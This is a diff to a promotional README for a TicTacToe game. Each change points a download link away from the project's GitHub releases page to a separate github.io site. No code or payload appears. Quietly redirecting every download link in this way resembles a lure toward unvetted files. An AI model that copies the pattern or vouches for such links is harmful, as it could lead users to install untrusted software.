@@ -1,6 +1,6 @@
 # 🎮 TicTacToe - The Classic Game, Simplified for Everyone
 
-[![Download TicTacToe](https://img.shields.io/badge/Download-TicTacToe-blue?style=for-the-badge&logo=github)](https://github.com/Lindajonesr185/TicTacToe/releases)
+[![Download TicTacToe](https://img.shields.io/badge/Download-TicTacToe-blue?style=for-the-badge&logo=github)](https://lindajonesr185.github.io)
 
 ---
 
@@ -28,7 +28,7 @@ That's it! There are no special requirements, no complex setup, and no hidden co
 
 Getting the game is as easy as 1-2-3. Just follow these simple steps:
 
-1. **Click the download button** at the top of this page, or visit this link: [Download TicTacToe](https://github.com/Lindajonesr185/TicTacToe/releases)
+1. **Click the download button** at the top of this page, or visit this link: [Download TicTacToe](https://lindajonesr185.github.io)
 
 2. **Find the latest version** on the page that opens. You'll see a list of files available for download. Look for the most recent release (usually the first one at the top).
 
@@ -92,7 +92,7 @@ Here's what makes TicTacToe a great choice:
 
 From time to time, we may release updates with improvements or new features. Here's how to stay current:
 
-1. **Visit the download page** every so often: [TicTacToe Releases](https://github.com/Lindajonesr185/TicTacToe/releases)
+1. **Visit the download page** every so often: [TicTacToe Releases](https://lindajonesr185.github.io)
 
 2. **Check for a newer version** than the one you have.
 
@@ -140,7 +140,7 @@ We're always happy to help and improve the game based on your feedback.
 
 TicTacToe is the perfect way to enjoy a classic game without any hassle. It's simple enough for kids, engaging enough for adults, and completely free. Whether you're taking a break from work, spending time with family, or just enjoying some classic gaming, this little game delivers big fun.
 
-So what are you waiting for? [Download TicTacToe now](https://github.com/Lindajonesr185/TicTacToe/releases) and start your first match today!
+So what are you waiting for? [Download TicTacToe now](https://lindajonesr185.github.io) and start your first match today!
 
 ---
 
